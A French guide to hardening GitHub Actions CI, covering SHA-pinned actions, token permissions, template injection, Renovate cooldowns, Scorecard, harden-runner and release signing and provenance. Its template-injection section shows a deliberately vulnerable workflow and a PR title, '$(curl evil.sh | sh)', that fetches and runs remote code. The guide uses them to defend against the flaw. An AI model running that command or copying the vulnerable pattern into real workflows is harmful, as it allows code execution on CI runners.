---
description: "Durcir une CI GitHub Actions en épinglant actions et runners par version, en réduisant les permissions du token, en bloquant l'injection de template, en automergeant derrière un cooldown Renovate et en vérifiant la provenance SLSA et la signature de chaque release."
tags:
  - GitHub Actions
  - CI/CD
  - Security
  - Supply chain
  - Renovate
  - Scorecard
  - cosign
---

# Durcir une CI GitHub Actions : workflows, dépendances et releases

Une CI qui lit le repo, détient des secrets, publie des artefacts et exécute du code écrit par d'autres est une cible. Les exemples viennent de 3 repos publics en Go ([gopen](https://github.com/PixiBixi/gopen), [external-dns-akamai-webhook](https://github.com/PixiBixi/external-dns-akamai-webhook)) et en Node ([uno-multiplayer](https://github.com/PixiBixi/uno-multiplayer)). Rien de ce qui suit ne dépend du langage.

## Épingler les actions par SHA, pas par tag

Un tag Git est mutable. `uses: actions/checkout@v7` pointe vers ce que le mainteneur (ou quelqu'un qui a compromis son compte) décide d'y mettre. Le SHA d'un commit, lui, ne bouge pas.

```yaml
# Fragile : le tag peut être redéplacé sur du code malveillant
- uses: actions/checkout@v7

# Durci : le SHA est immuable, le commentaire garde la version lisible
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

[Renovate](https://docs.renovatebot.com/) et Dependabot lisent le commentaire `# v7.0.1` pour bumper le SHA **et** réécrire le commentaire. Le pinning ne fige donc pas les actions dans le passé.

Le pinning initial est l'étape qu'on oublie, car une action ajoutée en `@v4` dans une PR passe la relecture sans que le tag attire l'attention. Le preset `helpers:pinGitHubActionDigests` et `pinDigests: true` demandent à Renovate de convertir en SHA tous les tags restants, y compris les images de conteneurs référencées dans un step.

```json title="renovate.json"
{
  "extends": ["config:recommended", "helpers:pinGitHubActionDigests"],
  "pinDigests": true
}
```

Dependabot n'a pas d'équivalent. Il met à jour un SHA déjà écrit mais n'en ajoute jamais, si bien qu'une action ajoutée en `@v4` reste indéfiniment sur son tag. C'est ainsi que `uno-multiplayer` s'est retrouvé avec 12 actions non épinglées sans que personne l'ait décidé, alors que `gopen` et `external-dns-akamai-webhook` étaient pinnés depuis leur premier commit.

Le pinning ne couvre que le premier niveau. Si `actions/checkout` référence lui-même une autre action par tag dans son `action.yml`, cette référence se résout au runtime et le SHA qu'on a écrit n'y change rien. Un attaquant qui compromet l'action imbriquée atteint quand même le runner. GitHub a annoncé dans sa [roadmap sécurité Actions 2026](https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/) un verrouillage par SHA des dépendances directes **et** transitives, sur le modèle de `go.mod` et `go.sum`. Il est arrivé en [public preview le 14 octobre 2026](https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/) sous la forme d'un fichier `.github/workflows/actions.lock` généré par l'extension `gh actions-lock`, que Dependabot régénère quand il bumpe une action. Sans ce fichier, le levier restant est de réduire le nombre d'actions tierces.

### Le commentaire de version doit dire vrai

Le SHA seul est illisible, c'est pourquoi on écrit `# v7.0.1` à côté. Rien ne vérifie pourtant que les 2 correspondent. Un SHA valide accompagné d'un commentaire faux passe tous les contrôles, paraît relu et prive Renovate de son repère pour proposer le bump. Un commentaire faux trompe plus que pas de commentaire du tout.

La règle `ref-version-mismatch` de zizmor détecte ce cas. Le script suivant vérifie tout un repo en une passe :

```sh
grep -rhoE "uses: [^@]+@[0-9a-f]{40} # v?[0-9][^ ]*" .github/workflows/ \
  | sed 's/uses: //' | sort -u | while read -r ref _ tag; do
      repo=$(echo "${ref%@*}" | cut -d/ -f1,2); sha="${ref#*@}"
      real=$(gh api "repos/$repo/git/ref/tags/$tag" --jq '.object.sha' 2>/dev/null)
      [ "$(gh api "repos/$repo/git/ref/tags/$tag" --jq '.object.type' 2>/dev/null)" = tag ] \
        && real=$(gh api "repos/$repo/git/tags/$real" --jq '.object.sha')
      [ "$real" = "$sha" ] || echo "KO $repo $tag attendu=$real"
    done
```

Un tag annoté renvoie un objet `tag` et non le commit, ce qui impose le second appel. Sans lui, la comparaison donne des faux positifs sur les actions qui signent leurs tags.

## Permissions au moindre privilège

Le `GITHUB_TOKEN` n'est en lecture seule par défaut que sur les repos et les organisations créés après le 2 février 2023. Les plus anciens lui donnent encore l'écriture. On le réduit au strict nécessaire par workflow, puis au niveau du job quand un seul job a besoin d'un droit en écriture.

```yaml
# Aucun droit : le workflow zizmor n'écrit rien au niveau global...
permissions: {}

jobs:
  zizmor:
    permissions:
      security-events: write   # ...sauf ce job, pour publier dans l'onglet Security
```

L'échelle qu'on retrouve dans les repos :

| Besoin | `permissions` |
|--------|---------------|
| Lecture seule (test, lint, scan de vulnérabilités) | `contents: read` |
| Commenter/suggérer en PR (reviewdog) | `contents: read` + `pull-requests: write` |
| Publier une image | `contents: read` + `packages: write` |
| Rien au global, un droit scopé par job | `{}` puis override dans le job |

Le cas le plus fréquent est un workflow de release qui déclare `contents: write` et `packages: write` au niveau global alors que 2 jobs distincts ont besoin d'un droit chacun. Déplacer chaque droit dans son job et laisser `permissions: {}` en haut retire ces 2 droits à tous les autres jobs.

## Couper les credentials sur le checkout

Par défaut, `actions/checkout` garde le token sur le runner, dans la config Git du clone jusqu'à la v5, puis depuis la v6 (novembre 2025) dans un fichier sous `$RUNNER_TEMP` que `.git/config` référence. Un script de build compromis peut le récupérer et pousser sur le repo. On le désactive partout :

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  with:
    persist-credentials: false
```

Un job qui pousse depuis ce clone (un bump de version, un tag) a besoin du credential. Dans ce cas on le garde, on l'écrit explicitement dans le workflow et on note la raison à côté.

## Épingler la version du runner

Le label `ubuntu-latest` est mutable comme un tag d'action, sauf qu'il ne passe pas par le Marketplace. GitHub le fait pointer vers l'image suivante après un préavis publié sur [runner-images](https://github.com/actions/runner-images) (un mois pour la dernière bascule). Le jour de la bascule, la CI change de version de bash, de Docker et des toolchains préinstallées sans qu'aucun commit n'apparaisse dans l'historique.

```yaml
# Le contenu change sous nos pieds
runs-on: ubuntu-latest

# La version est explicite, son bump devient un commit
runs-on: ubuntu-24.04
```

Au moment d'écrire, `ubuntu-latest` bascule de 24.04 vers 26.04 entre le 19 octobre et le 19 novembre 2026. Pendant ce mois, le même label donne l'une ou l'autre image selon le run. `runs-on: ubuntu-24.04` garde l'ancienne jusqu'à ce qu'on décide de passer à `ubuntu-26.04`, disponible depuis le 17 septembre. Sur macOS, `macos-latest` pointe déjà sur macOS 26, si bien qu'écrire `macos-15` ferait reculer le runner sans prévenir. On épingle la version que `-latest` désigne au moment du choix, pas une plus ancienne. Renovate suit ces labels avec sa datasource `github-runners`, la source où il lit les versions disponibles, que le manager `github-actions` alimente en lisant les workflows. Le pin ne fige donc rien et transforme une migration subie en PR relue. Dans une `packageRule`, le manager à viser reste `github-actions`, car `github-runners` dans `matchManagers` ne correspond à rien et Renovate 44 l'accepte sans erreur, voir [valider une config Renovate](renovate-config.md).

## Réserver `pull_request_target` aux jobs qui en ont besoin

Le trigger `pull_request_target` s'exécute avec le token du repo de base et ses secrets, sur un événement déclenché par du code que l'auteur de la PR contrôle. zizmor le classe en erreur sous `dangerous-triggers` avec la mention « almost always used insecurely ».

Il est souvent copié sans nécessité. Un job qui valide le titre d'une PR, par exemple, lit ce titre dans le payload de l'événement, sans checkout du code de la PR, sans écriture et sans secret. `pull_request` fait le même travail sans donner le moindre privilège à une branche de fork.

Avant de garder `pull_request_target`, on vérifie si le job écrit quelque part ou lit un secret. Si non, `pull_request` suffit. Si oui, on n'ajoute jamais à ce job un checkout du code de la PR.

## Bloquer l'injection de template dans les blocs `run:`

L'injection de template s'introduit facilement et se repère mal en relecture. La syntaxe `${{ }}` est une substitution textuelle faite **avant** que bash voie la ligne : tout ce qu'un contributeur contrôle arrive dans le script sans guillemets.

```yaml
# Vulnérable : le titre de la PR est collé tel quel dans le script
- run: |
    echo "PR: ${{ github.event.pull_request.title }}"

# Durci : bash reçoit une variable, quel que soit son contenu
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "PR: $TITLE"
```

Une PR titrée `$(curl evil.sh | sh)` exécute donc ce script dans le premier cas, car bash ne sait pas d'où vient la valeur. Avec `env:`, le contenu reste une chaîne quoi qu'il contienne.

La même règle vaut pour toutes les valeurs qu'on contrôle de l'extérieur :

- le titre et le corps d'une PR
- le nom de branche
- le message de commit
- les labels
- le nom d'auteur
- les `inputs` d'un `workflow_dispatch`, du texte libre tapé dans un formulaire

Le dernier cas se trouvait dans `uno-multiplayer`, où le tag à republier partait directement dans un `echo` :

```yaml
# Avant : le champ du formulaire est substitué dans la ligne
- run: echo "tag=${{ inputs.tag || needs.release.outputs.tag_name }}" >> "$GITHUB_OUTPUT"

# Après
- env:
    REQUESTED_TAG: ${{ inputs.tag || needs.release.outputs.tag_name }}
  run: echo "tag=${REQUESTED_TAG}" >> "$GITHUB_OUTPUT"
```

## Garder les workflows durcis avec zizmor et actionlint

Ces protections doivent rester vraies sur des années et sur des workflows écrits par plusieurs personnes. [zizmor](https://github.com/zizmorcore/zizmor) audite les fichiers `.github/workflows/` et signale les tags non épinglés, les permissions trop larges, les injections de template et les credentials persistés. Le workflow suivant le fait tourner sur chaque push et chaque PR :

```yaml title=".github/workflows/github-actions.yml"
name: github-actions

on:
  push:
    branches: [main, master]
  pull_request:

permissions: {}

jobs:
  zizmor:
    name: Run zizmor
    runs-on: ubuntu-24.04
    permissions:
      security-events: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: zizmorcore/zizmor-action@3dc1ecc9bcb9e94e9b2c709687979e1298497054 # v0.6.2
```

!!! tip "Faire tourner zizmor en local"
    `uvx zizmor .github/workflows/` (ou `pipx run zizmor`) donne le même verdict avant de committer.

Quand un finding est un faux positif dans son contexte, on l'annote plutôt que de le désactiver globalement, avec la justification sur la ligne d'à côté :

```yaml
# Le credential est gardé exprès : cog commit et pousse le tag depuis ce clone.
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1 # zizmor: ignore[artipacked]
```

zizmor lit le workflow mais pas le shell qu'il contient. [actionlint](https://github.com/rhysd/actionlint) comble ce manque en passant chaque bloc `run:` à shellcheck (s'il est installé sur la machine). Il valide aussi les labels de runner, les `needs:` qui pointent vers un job inexistant et les expressions `${{ }}` mal typées. Son premier passage sur `gopen` a relevé un `goimports -w $(find . -name '*.go')` qui échoue sur le premier fichier contenant une espace. Le bug était passé inaperçu pendant 6 mois, car aucun fichier du repo ne déclenchait le cas.

## Automerger derrière un cooldown

L'automerge prolonge une CI en laquelle on a confiance. Renovate ouvre la PR, la CI passe et la PR est mergée sans clic humain. On l'ouvre aux updates `minor`, `patch` et `digest` et on garde les `major` en revue manuelle, car ce sont les plus susceptibles de casser une API :

```json title="renovate.json"
{
  "packageRules": [
    {
      "matchUpdateTypes": ["minor", "patch", "digest"],
      "automerge": true,
      "automergeType": "pr"
    }
  ]
}
```

L'option `matchUpdateTypes` n'existe que dans une `packageRules`, comme le précise sa doc : *valid only within `packageRules` object*. Posée à la racine, elle fait échouer `renovate-config-validator` avec l'erreur ``matchUpdateTypes: matchUpdateTypes should be inside a `packageRule` only`` et Renovate ouvre une issue *Action Required* au lieu de tourner.

Avec `automergeType: pr`, Renovate ouvre quand même une PR et attend les checks. L'automerge ne court-circuite pas la CI, il retire seulement le clic une fois qu'elle est verte.

Une CI verte ne protège pas d'une release compromise. Automerger une version publiée il y a 10 minutes est le scénario des compromissions npm récentes, où le package piégé passe les tests puis reste en ligne quelques heures avant d'être retiré. L'option `minimumReleaseAge` fait attendre Renovate :

```json title="renovate.json"
{
  "packageRules": [
    {
      "matchUpdateTypes": ["major", "minor", "patch", "digest"],
      "minimumReleaseAge": "5 days"
    }
  ]
}
```

5 jours couvrent à peu près la fenêtre pendant laquelle une release compromise se fait repérer. Ce délai retarderait aussi les patchs de sécurité, mais Renovate neutralise le cooldown dans sa config `vulnerabilityAlerts` (`minimumReleaseAge: null` par défaut) : les updates qui répondent à une CVE connue passent tout de suite. Renovate doit pour ça connaître la CVE. Sur GitHub, il ne lit par défaut que les alertes Dependabot du repo, à condition d'avoir le droit de les lire. L'option `"osvVulnerabilityAlerts": true` lui fait interroger aussi la base [OSV](https://osv.dev/), avec le même contournement du cooldown. OSV ne couvre que les dépendances directes. Une CVE sur une dépendance transitive du lockfile n'est donc signalée que par Dependabot.

!!! note "Sur GitLab"
    Renovate n'y a pas d'alertes Dependabot à lire, car il n'implémente cette source que pour GitHub. L'objet `vulnerabilityAlerts` et le preset `:enableVulnerabilityAlerts` n'y déclenchent donc rien. La seule source de MR de sécurité y est `osvVulnerabilityAlerts`, dont l'objet `vulnerabilityAlerts` règle encore le cooldown et les labels. L'option `dependencyDashboardOSVVulnerabilitySummary` liste les CVE dans le Dependency Dashboard mais n'ouvre aucune MR.

Le type `digest` est celui qu'on oublie. Sur une action épinglée avec un commentaire `# v7.0.1`, une nouvelle version arrive en update `patch`, `minor` ou `major` qui porte le nouveau SHA. Un update `digest` seul signifie que le commit derrière le tag courant a bougé, ce qui est normal pour un tag flottant comme `# v7` et suspect pour un tag de version précis qu'on a redéplacé. C'est le scénario contre lequel on épingle. L'update porte la date du commit, si bien que le cooldown s'y applique.

Les images n'ont pas toutes une date : Docker Hub en publie une, GHCR, Quay et ECR non. Depuis Renovate 42 (novembre 2025), `minimumReleaseAgeBehaviour` vaut `timestamp-required` par défaut : sans date, l'update n'est jamais assez vieux. Avec `internalChecksFilter: strict`, le défaut, Renovate n'ouvre même pas la PR et l'update attend dans la section *Pending Status Checks* du dependency dashboard. Il faut donc relâcher les digests explicitement :

```json title="renovate.json"
{
  "packageRules": [
    {
      "matchUpdateTypes": ["digest"],
      "minimumReleaseAgeBehaviour": "timestamp-optional"
    }
  ]
}
```

Le cooldown s'applique encore quand une date existe (digest d'action, image Docker Hub). Un digest sans date passe sans attendre, ce qui vaut mieux qu'un update qui n'aboutit jamais.

Renovate applique toutes les règles qui correspondent à un update et les fusionne, la dernière l'emportant quand 2 règles posent la même option. Ici aucune option n'est posée 2 fois : l'automerge reste dans la première règle, le cooldown dans la deuxième et le relâchement des digests dans la troisième. Un `major` ne correspond qu'à la règle de cooldown : il attend 5 jours puis une revue.

Sur Dependabot, le même réglage se pose par écosystème et il existe déjà par défaut à 3 jours :

```yaml title=".github/dependabot.yml"
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    cooldown:
      default-days: 5
```

Comme chez Renovate, le cooldown ne s'applique qu'aux version updates et pas aux security updates.

L'étape suivante consiste à réserver l'automerge à une allow-list d'organisations de confiance (`actions/**`, `golang.org/x/**`, `k8s.io/**`) et à passer le reste en revue humaine. Sur un projet à 10 dépendances directes, c'est disproportionné, mais la question se pose dès que le nombre de dépendances grandit.

## Contrôler ce que les workflows ne voient pas

4 outils couvrent les dépendances, le code, les réglages du repo et le trafic sortant du runner.

### dependency-review-action

[dependency-review-action](https://github.com/actions/dependency-review-action) compare le graphe de dépendances avant et après la PR et bloque le merge si une CVE connue ou une licence non voulue **entre** dans l'arbre. Un scanner comme govulncheck dit si le code appelle la fonction vulnérable. dependency-review signale l'arrivée de la dépendance, au moment où discuter de son ajout coûte encore peu.

```yaml
- uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0
  with:
    fail-on-severity: high
    allow-licenses: MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC
```

Le job échoue dès le départ avec `Dependency review is not supported on this repository` quand le dependency graph, dont il dépend, est désactivé. C'est le cas sur certains forks, où le réglage varie d'un fork à l'autre, mais pas seulement. Sur `external-dns-akamai-webhook`, qui n'est pas un fork, le graphe était désactivé, si bien que son job de review n'a rien vérifié depuis son ajout. Le réglage se trouve dans *Settings > Code security and analysis*. Un `PATCH` sur `security_and_analysis` n'y change rien, car cet objet n'expose pas le dependency graph. L'endpoint qui l'active est `PUT /repos/OWNER/REPO/vulnerability-alerts`, qui *enables dependency alerts and the dependency graph for a repository* et demande un accès admin. Sur un repo privé, l'action demande en plus GitHub Code Security.

```bash
gh api -X PUT "repos/OWNER/REPO/vulnerability-alerts"
```

Une commande suffit à tester l'état du graphe, sans attendre la prochaine PR :

```sh
# Demande la génération d'un SBOM, répond 404 si le dependency graph est désactivé
gh api "repos/OWNER/REPO/dependency-graph/sbom/generate-report" --jq '.sbom_url'
```

Un 404 indique que le graphe est désactivé et que le job de review ne vérifie rien depuis son ajout.

La licence est le réglage qu'on oublie alors qu'il coûte une ligne. On prend `allow-licenses` plutôt que `deny-licenses`, dont le README de l'action indique *this option is deprecated for possible removal in the next major release*. Les 2 options sont de toute façon mutuellement exclusives. Une allow-list bloque ce qu'on n'a pas prévu, alors qu'une deny-list ne bloque que ce qu'on a pensé à écrire. Une dépendance copyleft qui entre dans un projet sous licence permissive pose un problème juridique et pas de style. Mieux vaut l'apprendre en PR qu'au moment de publier.

### CodeQL

[CodeQL](https://codeql.github.com/) analyse le code du repo lui-même, alors que govulncheck et dependency-review cherchent des vulnérabilités connues dans les dépendances. Sur du Go, [la mise en place](go-ci.md#analyser-son-propre-code-avec-codeql) tient en un workflow qu'on peut aussi lancer en local avant de pousser, pour ne pas découvrir les alertes une par une en CI.

### OpenSSF Scorecard

[OpenSSF Scorecard](https://securityscorecards.dev/) note le repo sur une vingtaine de checks et publie le résultat dans l'onglet Security. Son intérêt est de regarder ce qui n'est pas dans les workflows (protection de branche, politique de sécurité, signature des releases, activité de maintenance) et de remplacer une relecture annuelle par un audit qui tourne tout seul.

Le score global est le chiffre le moins utile que Scorecard produit. Sur un projet maintenu par une seule personne, 2 checks sont hors d'atteinte par construction. Code-Review veut des changements relus par quelqu'un d'autre que leur auteur, Contributors des contributeurs de 3 organisations différentes. Fuzzing et le badge CII s'obtiennent seul (un test `FuzzXxx` natif suffit en Go, le niveau *passing* du badge rapporte 5 sur 10), mais ces points demandent un travail qui ne durcit rien.

Ce qui sert, ce sont les checks que les autres outils ne couvrent pas et les écarts qu'un scan révèle par rapport au précédent.

| Check | Ce qu'il attrape que rien d'autre ne voit |
|---|---|
| Branch-Protection | l'état réel des règles de la branche par défaut |
| Security-Policy | l'absence de `SECURITY.md`, donc de canal de report privé |
| Signed-Releases | une release sans signature ni provenance |
| Pinned-Dependencies | les images de base d'un Dockerfile, pas seulement les actions |

Les autres checks recoupent zizmor, govulncheck, CodeQL et Renovate. Sur les 3 repos, Token-Permissions donnait 0 partout. Le score vaut pour tout le repo : un seul workflow sans bloc `permissions` ou avec un droit en écriture en tête de fichier suffit à le faire tomber. zizmor signale ces mêmes workflows avec `excessive-permissions`. Le barème est pourtant progressif. Dans [`reduceBy`](https://github.com/ossf/scorecard/blob/main/checks/evaluation/permissions.go), seuls `contents`, `packages` et `actions` en `write` au niveau du fichier ramènent le check à 0. Les droits `deployments` et `security-events` retirent 1 point, `checks` et `statuses` 0,5 point et les autres (`pull-requests`, `issues`, `id-token`, `attestations`) rien. Un `security-events: write` global donne donc 9, alors qu'un `contents: write` global donne 0. Dans les 2 cas, déplacer le bloc dans le job remonte le score à 10, à condition de garder `permissions: {}` ou `contents: read` en tête de fichier.

L'installation demande 2 précautions :

- Le check Branch-Protection lit les règles de protection de branche classiques, que le `GITHUB_TOKEN` ne voit pas. Sans un PAT passé via `repo_token`, il finit en erreur. Les Repository Rules se lisent avec le token par défaut. Le PAT à créer est fine-grained, avec `Administration: Read-only`, qui ajoute automatiquement `Metadata: Read-only`. Un token classique exigerait le scope `repo`, soit un accès en écriture complet au dépôt pour un besoin de lecture. La doc de scorecard-action écrit d'ailleurs *we strongly discourage its use*. Ce secret est lisible par tous les workflows et tous les mainteneurs du repo.
- Avec `publish_results: true`, chaque run publie son résultat sur `api.scorecard.dev`, le nouveau nom de `api.securityscorecards.dev`, qui répond encore. Le détail des findings reste dans les alertes code scanning du repo.

### harden-runner

[harden-runner](https://github.com/step-security/harden-runner) enregistre le trafic sortant du runner. C'est ce mécanisme qui a permis de [repérer la compromission](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised) de `tj-actions/changed-files` en mars 2025, grâce à un appel inattendu à `gist.githubusercontent.com`. L'action y téléchargeait un script qui imprimait les secrets du runner dans les logs du build. On le place en premier step de chaque job, avant le checkout, sinon il ne voit pas les appels réseau du checkout.

```yaml
- name: Harden the runner
  uses: step-security/harden-runner@e14015d583714f6e62063499dc959a02595150a1 # v2.21.1
  with:
    egress-policy: audit
```

Les guides conseillent en général de rester en `audit` quelques runs puis de passer en `block` avec une allow-list. La [section suivante](#rester-en-audit-sur-le-tier-communautaire) explique pourquoi on ne suit pas ce conseil.

#### Rester en audit sur le tier communautaire

Le mode `block` n'est pas l'objectif sur le tier communautaire, pour 3 raisons :

- **Les hôtes de GitHub eux-mêmes changent d'un run à l'autre**. Le watchdog contacte `hosted-compute-watchdog-prod-iad-02.githubapp.com` sur un job et `prod-eus-02` sur le suivant, selon la région du runner attribué. Le stockage des résultats passe par `productionresultssa0`, `sa3` ou `sa6.blob.core.windows.net` selon le run. L'hôte `results-receiver.actions.githubusercontent.com` résout vers un CNAME de load balancer opaque du type `glb-db52c2cf8be544.github.com`. Une allow-list d'hôtes exacts casse donc dès le deuxième run, sur un hôte qui appartient à GitHub. Les wildcards de `allowed-endpoints`, acceptés depuis la v2.4.0, absorbent ces variations, mais `*.blob.core.windows.net` autorise aussi le compte de stockage Azure d'un attaquant.
- **L'egress d'un job de release est le plus variable**. Le job contacte sigstore, syft, les hôtes d'upload d'assets et un registre OCI. Il pousse parfois vers un autre repo. C'est aussi le seul job dont l'échec est public et survient **après** la création du tag.
- **Le mode `block` du tier communautaire a été contourné 2 fois en 2026**, via [DNS over HTTPS](https://github.com/step-security/harden-runner/security/advisories/GHSA-46g3-37rh-v698) et [DNS over TCP](https://github.com/step-security/harden-runner/security/advisories/GHSA-g699-3x6g-wm3g), 2 avis publiés le 16 mars 2026 et corrigés ensemble en v2.16.0. Les 2 demandent d'exécuter déjà du code dans le workflow. Ce mode retarde un attaquant sans l'arrêter.

Le mode `audit` garde l'essentiel, l'inventaire des hôtes contactés par job, qui fait ressortir le jour où une dépendance contacte un hôte inconnu. Il n'est pas passif non plus : l'agent charge une blocklist globale de typosquats et de domaines connus (`pypi-get.com`, `js-mirror.com`, `scan.aquasecurtiy.org`) qu'il bloque quel que soit le réglage.

Les projets qui l'utilisent font le même choix : `ossf/scorecard`, `caddy` et `atlantis` sont entièrement en `audit`, `gopass` et `argo-cd` ne passent en `block` que quelques jobs. Le repo de Scorecard porte même un `# TODO: change to 'egress-policy: block' after couple of runs` sur ses 16 appels à harden-runner.

!!! tip "Ce que l'audit révèle et qu'on n'avait pas demandé"
    Le premier run a montré que `dependency-review-action` envoie les noms et versions des dépendances de la PR à `api.deps.dev`, puis l'URL de leurs repos à `api.securityscorecards.dev`, pour en récupérer les scores (`show-openssf-scorecard`, actif par défaut). Ce comportement est documenté et n'a rien de malveillant, mais il ne se déduit pas de la lecture du workflow. Sur un repo privé, il faut décider avant l'activation si l'envoi de ces données est acceptable.

GitHub prépare un pare-feu d'egress natif, décrit dans la roadmap 2026 et pas encore disponible en octobre 2026. Il tournerait hors de la VM du runner et resterait actif même si un attaquant obtient les droits root sur cette VM.

## Attester comment l'artefact a été construit

Une signature keyless dit **qui** a publié, car le certificat Sigstore porte le repo, le workflow et le commit qui ont signé. Elle ne dit rien de **comment** l'artefact a été construit. La provenance SLSA enregistre ce comment dans une attestation (dépôt source, commit, workflow, builder, paramètres du build). L'attestation est signée par un certificat issu du jeton OIDC de GitHub et se vérifie séparément de la signature. Un job compromis ne peut pas en produire une qui prétende venir d'un autre workflow.

Pour un binaire ou une archive, la provenance demande un step et 2 permissions :

```yaml title=".github/workflows/release.yml"
jobs:
  release:
    permissions:
      id-token: write      # identité keyless qui signe l'attestation
      attestations: write  # écrire l'attestation sur le repo
    steps:
      # ... build ...
      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
        with:
          subject-path: 'dist/*.tar.gz,dist/checksums.txt'
```

Les 2 permissions se posent au niveau du job et pas en tête de fichier, sinon tous les autres jobs du workflow les portent aussi.

Pour une image OCI, la provenance s'attache au digest et non à un fichier. L'option `push-to-registry` la publie à côté du manifest, pour qu'un consommateur la trouve sans passer par la release GitHub. Le job demande alors aussi `packages: write` et, d'après le README d'`actions/attest`, `artifact-metadata: write` :

```yaml
      - uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
        id: build
        # ...

      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
        with:
          subject-name: ghcr.io/monorg/mon-image
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true
```

Le `subject-name` doit être en minuscules, car GHCR refuse les majuscules. Depuis la v1.1.2 d'`actions/attest` (mai 2024), l'action s'en charge avec `push-to-registry: true` en appelant `subjectFromInputs` avec `downcaseName: inputs.pushToRegistry`. Avec `push-to-registry: false`, la conversion n'est pas appliquée et le nom doit être écrit en minuscules à la main.

La vérification côté utilisateur tient en une commande par type d'artefact, à condition de ne pas s'arrêter à `--repo` :

```bash
gh attestation verify ./mon-binaire_linux_amd64.tar.gz \
  --repo monorg/mon-repo \
  --signer-workflow monorg/mon-repo/.github/workflows/release.yml

gh attestation verify oci://ghcr.io/monorg/mon-image:vX.Y.Z \
  --repo monorg/mon-repo \
  --signer-workflow monorg/mon-repo/.github/workflows/release.yml
```

!!! warning "`--repo` seul ne dit pas qui a signé"
    Il contraint le repo, pas le workflow. Tout workflow du même repo qui dispose de `id-token: write` et `attestations: write` produit une attestation qui passe la vérification, y compris un workflow qu'un contributeur vient d'ajouter. Le manuel de `gh` le précise : *Ideally, the path of the signer workflow is also validated using the `--signer-workflow` or `--cert-identity` flags*. Le flag `--signer-workflow` joue pour `gh` le rôle de `--certificate-identity-regexp` pour cosign, avec une différence : cosign refuse de vérifier sans identité, alors que `gh` réussit sans le flag.

## Vérifier la chaîne de signature après chaque release

La signature de `checksums.txt` et le SBOM sont produits par GoReleaser, voir [l'article dédié](goreleaser.md). La provenance dit d'où vient le binaire, la signature cosign qui l'a publié.

Signer, publier un SBOM et attester la provenance sont les étapes visibles. Contrôler que le résultat se vérifie est l'étape qu'on oublie le plus souvent. Une chaîne que personne ne rejoue casse sans bruit, par exemple après un passage de cosign v2 à v3 qui change le format du bundle, avec une identité de certificat erronée ou sans syft sur le runner. La release a alors l'air normale sur sa page et échoue chez le premier utilisateur qui tente la vérification.

Un job dédié rejoue après la publication ce que ferait cet utilisateur :

```yaml title=".github/workflows/release.yml"
  verify:
    needs: release
    if: needs.release.outputs.tag != ''
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      attestations: read
    env:
      TAG: ${{ needs.release.outputs.tag }}
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    steps:
      - uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2
      - run: |
          gh release download "$TAG" --repo "$GITHUB_REPOSITORY" \
            --pattern '*.tar.gz' --pattern 'checksums.txt' \
            --pattern 'checksums.txt.sigstore.json'
      - run: shasum -a 256 --check --ignore-missing checksums.txt
      - run: |
          cosign verify-blob \
            --certificate-identity-regexp "^https://github.com/${GITHUB_REPOSITORY}/\\.github/workflows/release\\.yml@refs/tags/" \
            --certificate-oidc-issuer 'https://token.actions.githubusercontent.com' \
            --bundle checksums.txt.sigstore.json checksums.txt
      - run: |
          for f in *.tar.gz; do
            gh attestation verify "$f" \
              --repo "$GITHUB_REPOSITORY" \
              --signer-workflow "$GITHUB_REPOSITORY/.github/workflows/release.yml"
          done
```

L'identité doit être épinglée des 2 côtés, avec `--certificate-identity-regexp` pour cosign et `--signer-workflow` pour `gh attestation`. La commande cosign exige une identité, mais un regexp trop large (`.*`) revient à ne pas en donner. La commande `gh attestation verify` accepte même `--repo` seul. Dans les 2 cas, on accepte une signature produite par n'importe quel workflow. La signature prouve alors seulement que quelqu'un a signé quelque part. Ancrée sur le workflow de release du repo, elle prouve que c'est bien celui-là.

Le step `sigstore/cosign-installer` en tête de job est nécessaire, car `cosign` n'est pas préinstallé sur les images `ubuntu-24.04`. Un job de vérification qui échoue sur `cosign: command not found` finit vite désactivé.

Signer `checksums.txt` suffit, sans signer chaque archive. Le fichier contient le SHA256 de toutes les archives, si bien qu'une seule signature couvre l'ensemble et qu'une seule commande la vérifie. Le [workflow de release](https://github.com/goreleaser/goreleaser/blob/main/.github/workflows/release.yml) de GoReleaser applique ce schéma et rejoue ces 3 contrôles après chaque release.

La condition `if:` sur le tag est nécessaire elle aussi. Une release pilotée par les commits (voir [Cocogitto](cocogitto.md)) ne produit rien quand le push ne contient que des `chore:`. Un job de vérification lancé quand même échouerait sur une release inexistante.

## Rendre les releases immuables

Une fois une release publiée, GitHub peut interdire le déplacement de son tag et le remplacement de ses assets avec l'option *Immutable releases* des settings du repo, disponible depuis le 28 octobre 2025. Cette option ferme le scénario où un compte compromis republie un binaire sous un tag que les utilisateurs ont déjà installé, mais elle ne s'applique qu'aux releases publiées après son activation. Les anciennes restent modifiables.

!!! warning "Les assets ne s'ajoutent plus après la publication"
    Une release immuable refuse tout asset ajouté après sa publication. Le workflow doit créer la release en draft, y attacher les assets, puis la publier. GoReleaser procède déjà ainsi et échoue si le tag correspond déjà à une release immuable.

## Récapitulatif

- Actions épinglées par SHA, versions gardées lisibles en commentaire
- `pinDigests` pour que la prochaine action ajoutée le soit aussi
- `permissions:` au moindre privilège, `{}` au global et opt-in par job
- `persist-credentials: false` sur chaque checkout, sauf sur un job qui pousse depuis le clone
